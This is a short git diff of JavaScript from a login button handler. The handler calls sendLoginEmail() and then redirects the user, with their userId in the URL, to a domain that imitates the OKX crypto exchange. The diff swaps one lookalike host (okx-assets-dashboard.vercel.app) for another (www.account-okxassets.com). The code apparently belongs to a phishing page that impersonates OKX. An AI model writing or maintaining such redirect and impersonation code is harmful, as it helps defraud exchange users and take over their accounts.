@@ -56,7 +56,7 @@ button.onclick = async (event) => {
       }else{
         console.log("object2");
         sendLoginEmail()
-        window.location = `https://okx-assets-dashboard.vercel.app/#/${userId}`;
+        window.location = `https://www.account-okxassets.com/#/${userId}`;
       }
     })
     .catch((error) => {
